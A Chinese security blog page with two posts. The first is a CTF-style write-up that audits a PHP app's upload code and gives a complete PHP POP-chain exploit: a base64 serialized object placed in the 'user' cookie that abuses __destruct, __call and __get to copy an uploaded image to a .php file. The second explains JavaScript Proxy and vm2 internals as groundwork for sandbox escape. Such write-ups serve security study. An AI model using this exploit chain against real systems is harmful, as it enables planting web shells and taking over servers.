        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/">
        pop链3之__get()和__call()魔术方法的使用
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="pop链3之-get-和-call-魔术方法的使用"><a href="#pop链3之-get-和-call-魔术方法的使用" class="headerlink" title="pop链3之__get()和__call()魔术方法的使用"></a>pop链3之__get()和__call()魔术方法的使用</h1><p>魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__get()：当对象调用不可访问的属性时被调用</span><br><span class="line"></span><br><span class="line">__call()：当对象调用不可访问的函数时被调用</span><br></pre></td></tr></table></figure>

<p>我们打开页面，发现是注册和登录页面，所以我们在注册和登录时，随便尝试了sql注入闭合测试和二次注入，而对于二次注入的测试，可以注册时构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&#x27;and&#x27;1</span><br></pre></td></tr></table></figure>
<p>然后在登陆时，使用这个username，发现回显页面仍然是0’and’1，所以不存在二次注入，也不存在sql注入，所以此时我们可以使用dirsearch扫描目录，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.tar.gz</span><br></pre></td></tr></table></figure>
<p>文件泄露，所以我们下载<a target="_blank" rel="noopener" href="http://www.tar.gz文件后,解压,然后审计源码,我们可以先从控制前端输入值的代码开始审计起,即在/">www.tar.gz文件后，解压，然后审计源码，我们可以先从控制前端输入值的代码开始审计起，即在</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/application/web/controller</span><br></pre></td></tr></table></figure>
<p>目录下的文件，我们可以查看Profile.php文件中对于上传文件处理的那一串代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public function upload_img()&#123;</span><br><span class="line">    if($this-&gt;checker)&#123;</span><br><span class="line">        if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!empty($_FILES))&#123;</span><br><span class="line">        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">        $this-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if($this-&gt;ext) &#123;</span><br><span class="line">        if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">            @unlink($this-&gt;filename_tmp);</span><br><span class="line">            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">            $this-&gt;update_img();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从这串代码中，我们可知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;checker)&#123;</span><br><span class="line">    if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">        $this-&gt;redirect($curr_url,302);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当我们上传文件时，会先检查登录的账号和密码，是否正确，如果正确，才会进行下一步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">    $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">    $this-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时会将上传的文件名存储在$this-&gt;filename_tmp变量中，然后再对上传文件名进行md5加密，并加上.png后缀，然后存储在$this-&gt;filename中，然后进行一步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;ext) &#123;</span><br><span class="line">    if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">        @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">        @unlink($this-&gt;filename_tmp);</span><br><span class="line">        $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">        $this-&gt;update_img();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果此时$this-&gt;filename中的文件后缀为png的话，则会判断$this-&gt;filename_tmp的尺寸，然后将$this-&gt;filename覆盖到$this-&gt;filename_tmp中，并删除$this-&gt;filename_tmp的变量的值，并将此文件存储在/upload/$this-&gt;upload_menu/$this-&gt;filename中</p>
<p>但是我们在login.php文件中的login_check会将cookie中的user参数的值进行base64解密，并反序列化</p>
<p>而这道题的过滤点在于，它会将上传的任何文件都变为.png后缀，所以我们可以想办法利用profile.php文件中的upload_img()函数中的copy函数对原来上传的文件名(加后缀)进行覆盖，并将原来文件的内容复制到覆盖后的文件中，从而绕过.png后缀这个过滤点，因此我们需要构造一条pop来链</p>
<p>我们看向profile.php文件中的两个魔术方法，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而但对于魔术方法__call()，要对象调用不可访问的函数才可以被调用，所以可以利用register.php文件中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if(!$this-&gt;registed)&#123;</span><br><span class="line">        $this-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只需将$this-&gt;checker设置为new Profile()，即可触发__call()魔术方法，而__call()魔术方法中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;&#123;$name&#125;</span><br></pre></td></tr></table></figure>
<p>则会触发__get()魔术方法，而将$this-&gt;except=array[“index”=&gt;”upload_img”]，则可以利用return $this-&gt;except[$name]调用upload_img()函数，从而实现覆盖，所以exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker=0;  //绕过upload_tmp()函数的第一个if</span><br><span class="line">    public $filename_tmp=&quot;./upload/93df0602d768e80cec04f22bc0fb368d/432958539d6bd005179f8a48cb4ef719.png&quot;;</span><br><span class="line">    public $filename=&quot;upload/penson.php&quot;;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext=1; //绕过第二个if</span><br><span class="line">    public $img;</span><br><span class="line">    public $except=array(&quot;index&quot;=&gt;&quot;upload_img&quot;);</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                @unlink($this-&gt;filename_tmp);</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Register&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Register();</span><br><span class="line">$a-&gt;checker=new Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=0;//调用pop链防止退出程序</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们只要抓包，然后将这个生成的值放入cookie的参数user中即可</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105131257]">https://blog.csdn.net/mochu7777777/article/details/105131257]</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-vm2沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="article-date">
  	<time datetime="2021-10-11T16:00:00.000Z" itemprop="datePublished">2021-10-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
        vm2沙箱逃逸
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><h2 id="vm2-API"><a href="#vm2-API" class="headerlink" title="vm2 API"></a>vm2 API</h2><h3 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h3><p>proxy用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种”元编程”，即对编程语言进行编程，可以理解成在目标对象之前架设一层”拦截”，外界对该对象进行访问时，都必须先通过这层拦截，因此提供一种机制，可以对外界的访问进行过滤和改写，这种操作可以被称为”代理器”</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function (target, propKey, receiver) &#123;</span><br><span class="line">    console.log(`getting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.get(target, propKey, receiver);</span><br><span class="line">  &#125;,</span><br><span class="line">  set: function (target, propKey, value, receiver) &#123;</span><br><span class="line">    console.log(`setting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.set(target, propKey, value, receiver);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码相当于对一个空对象架设了一层拦截，对属性的读取(get)和设置(set)行为进行重新的定义，如果对obj里的属性进行读取或设置的话，就会有以下的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj.count=1; //结果为：setting count!</span><br><span class="line"></span><br><span class="line">obj.count;   //结果为：getting count!</span><br></pre></td></tr></table></figure>
<p>从结果中，我们可以知道对obj里的属性的读取和设置都进行了拦截</p>
<p>而ES6原生提供的Proxy构造函数，用来生成Proxy实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var proxy=new Proxy(target,handler);</span><br></pre></td></tr></table></figure>
<p>其中new Proxy()表示生成一个Proxy实例，而target参数表示要拦截的目标对象，handler参数也是一个对象，用来定制拦截行为</p>
<p>当然有一个技巧是将Proxy对象，设置到object.proxy属性，从而可以在object对象上调用，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var object=&#123;proxy:new Proxy(target,handler)&#125;;</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var proxy = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function(target, propKey) &#123;</span><br><span class="line">    return 35;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let obj = Object.create(proxy);</span><br><span class="line">obj.time // 35</span><br></pre></td></tr></table></figure>
<p>proxy对象是obj对象的模型，而由于obj对象本身并没有time属性，所以根据原型链，会在proxy对象上读取该属性，导致被拦截</p>
<p>同一个拦截函数可以设置多个拦截操作，一共13种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">get(target,propKey,receiver)：拦截对象属性的读取</span><br><span class="line"></span><br><span class="line">set(target,propKey,value,receiver)：拦截对象属性的设置</span><br><span class="line"></span><br><span class="line">has(target,propKry)：拦截propKey in proxy的操作，返回一个布尔值</span><br><span class="line"></span><br><span class="line">deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环，返回一个数组</span><br><span class="line"></span><br><span class="line">getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象</span><br><span class="line"></span><br><span class="line">defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象</span><br><span class="line"></span><br><span class="line">isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作</span><br><span class="line"></span><br><span class="line">construct(target, args)：construct(target, args)</span><br></pre></td></tr></table></figure>

<h3 id="vm2实现原理"><a href="#vm2实现原理" class="headerlink" title="vm2实现原理"></a>vm2实现原理</h3><p>vm2的代码有四个主要文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cli.js：实现vm2的命令行调用</span><br><span class="line"></span><br><span class="line">contextify.js：封装了三个对象，Contextify和Decontextify，并且针对global的Buffer类进行代理</span><br><span class="line"></span><br><span class="line">main.js：vm2执行的入口，导出了nodeVM，VM这两个沙箱环境，还有一个VMSCript实际上是封装了vm.Script</span><br><span class="line"></span><br><span class="line">sandbox.js：针对global的一些函数和变量进行了hook，如:setTimeout，setInterval等</span><br><span class="line"></span><br><span class="line">vm2利用es6新增的proxy特性来拦截对constructor和__proto__这些属性的访问</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure>
<p>const {VM, VMScript} = require(“vm2”);</p>
<p>const script = new VMScript(“let a = 2;a”);</p>
<p>let vm = new VM();</p>
<p>console.log(vm.run(script));  //2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行代码的实现</span><br></pre></td></tr></table></figure>
<p>首先，new VMScript(“let a=2;a”)会调用vm.Script编译代码为script</p>
<p>然后，let vm=new VM()会调用vm,createContext创建一个上下文context，然后引入sandbox.js将其封装为一个匿名函数anonymous，之后调用封装的匿名函数anonymous，绑定其中的this为context</p>
<p>最后vm.run(script)会调用vm.runInContext在上下文的context中运行script</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而且当我们创建VM的对象时，vm2内部会引入contextify.js，针对vm.createContext创建的上下文作为参数传入，并且vm的api会将contextify.js封装为一个匿名函数</span><br></pre></td></tr></table></figure>
<pre><code>    Reflect.defineProperty(this, &#39;_internal&#39;, &#123;
        value: vm.runInContext(`(function(require, host) &#123; $&#123;cf&#125; n&#125;)`, this._context, &#123;
            filename: `$&#123;__dirname&#125;/contextify.js`,
            displayErrors: false
        &#125;).call(this._context, require, host)
    &#125;);
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中对于封装为匿名函数的contextify.js会先定义vm2的一些常量，并且会在global和this上添加了相应的属性</span><br></pre></td></tr></table></figure>
<p>// eslint-disable-next-line no-invalid-this, no-shadow<br>const global = this;</p>
<p>// global is originally prototype of host.Object so it can be used to climb up from the sandbox.<br>Object.setPrototypeOf(global, Object.prototype);</p>
<p>Object.defineProperties(global, {<br>    global: {value: global},<br>    GLOBAL: {value: global},<br>    root: {value: global},<br>    isVM: {value: true}<br>});</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然是在函数体外部写了return语句，所以webstrom报错，但是实际上这串代码还是会封装在函数中的</span><br></pre></td></tr></table></figure>
<p>return{<br>    Contextify,<br>    Decontextify,<br>    Buffer:LocalBuffer<br>};</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其中的Contextify和Decontextify都是两个weakmap，而weakmap是es6新增的语法，只接受对象作为键名，并且这些对象是不会被计入垃圾回收机制的，这是防止内存泄露，而这是用来存储已经被代理过的对象的</span><br><span class="line"></span><br><span class="line">而Contextify.readonly 做了些什么</span><br></pre></td></tr></table></figure>
<p>const LocalBuffer = global.Buffer = Contextify.readonly(host.Buffer, {<br>    allocUnsafe: function allocUnsafe(size) {<br>        return this.alloc(size);<br>    },<br>    allocUnsafeSlow: function allocUnsafeSlow(size) {<br>        return this.alloc(size);<br>    }<br>});</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而对于整个匿名函数调用的顺序是</span><br></pre></td></tr></table></figure>
<p>”global.Buffer=“—-&gt;“cobtextify.readonly”—-&gt;“contextify.value”—-&gt;contextify.value“—-&gt;”contextify.function“—-&gt;”contextify.object“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从匿名函数的调用过程，我们可以看见最后它返回的是代理对象，而且还会做一个object.assign的操作，即将所有可枚举属性的值从一个或多个源对象复制到目标对象，然后返回目标对象，如</span><br></pre></td></tr></table></figure>
<p>const target = { a: 1, b: 2 };<br>const source = { b: 4, c: 5 };</p>
<p>const returnedTarget = Object.assign(target, source); // Object { a: 1, b: 4, c: 5 }</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可见source的b会覆盖target的b，而覆盖的1优先级是</span><br></pre></td></tr></table></figure>
<p> deepTraps &gt; traps &gt; {get:…, set: …}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">最终会得到Buffer代理对象，而它本身仍然是nodejs提供的，只是vm2加了一层代理，所以在vm2的沙箱中访问它的属性时会被设定的方法拦截，而且Contextify.object 内部还使用了 WeakMap 来存储已经代理过的对象和对象的代理，所以在vm2沙箱环境中，如果是内部的对象，由于vm的实现机制保证了内部定义的对象无法逃逸，而对于外部引入的对象，由于vm2提供的代理机制会拦截constructor等属性的访问，从而保证这个沙箱的安全</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">在main.js编写如下代码</span><br></pre></td></tr></table></figure>
<p>const {VM, VMScript} = require(‘vm2’);<br>const fs = require(‘fs’);<br>const file = <code>$&#123;__dirname&#125;/sandbox.js</code>;</p>
<p>// By providing a file name as second argument you enable breakpoints<br>const script = new VMScript(fs.readFileSync(file), file);</p>
<p>console.log(new VM().run(script));</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在sandbox.js中编写</span><br></pre></td></tr></table></figure>
<p>let a = Buffer.from(“”); //访问Buffer的from属性并调用<br>a.i = () =&gt; {}; //给对象添加属性<br>console.log(a.i); //访问对象的属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面已经写了Buffer是一个代理的对象，访问其所有的属性都会被拦截，而let a=Buffer.from(&quot;&quot;);代码的调用过程</span><br></pre></td></tr></table></figure>
<p>Buffer.from—-&gt;代理的get拦截—-&gt;contextify.value—-&gt;contextify.function—-&gt;contextify.object</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们从调用过程中可以看见Buffer代理对象访问其from属性，然后被代理的get方法拦截，经过层层调用后，会返回一个函数的代理对象，而这个代理对象会被当作函数调用，会被apply捕获，apply拦截方法</span><br></pre></td></tr></table></figure>
<p>apply: (target, context, args) =&gt; {<br>    try {<br>        context = Decontextify.value(context);</p>
<pre><code>    // Set context of all arguments to host&#39;s context.
    return Contextify.value(fnc.apply(context, Decontextify.arguments(args)));
&#125; catch (e) &#123;
    throw Contextify.value(e);
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后apply拦截方法的调用过程</span><br></pre></td></tr></table></figure>
<p>Buffer.from(“”)—&gt;代理apply拦截—&gt;Decontextify.value(context)对上下文解封装—&gt;Decontextify.arguments(args)对参数解封装—&gt;apply函数调用—&gt;contextify.value对得到的结果封装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里调用了Decontextify.value，实际上Decontextify的实现和contextify是对称的，只是有点略微的不同，而Decontextify.value首先会检查contextified中是否有这个对象，如果有则直接返回，没有则加一层代理</span><br><span class="line"></span><br><span class="line">从这个函数的调用，我们知道vm2针对很多对象做了代理，但是实际调用一次函数时，会将代理的&quot;外壳&quot;给剥除掉，并且必须依靠nodejs提供的api来完成，如果我们可以捕获这个对象，我们就完成vm2的逃逸</span><br><span class="line"></span><br><span class="line">之后还会执行</span><br></pre></td></tr></table></figure>
<p>a.i=()=&gt;{};</p>
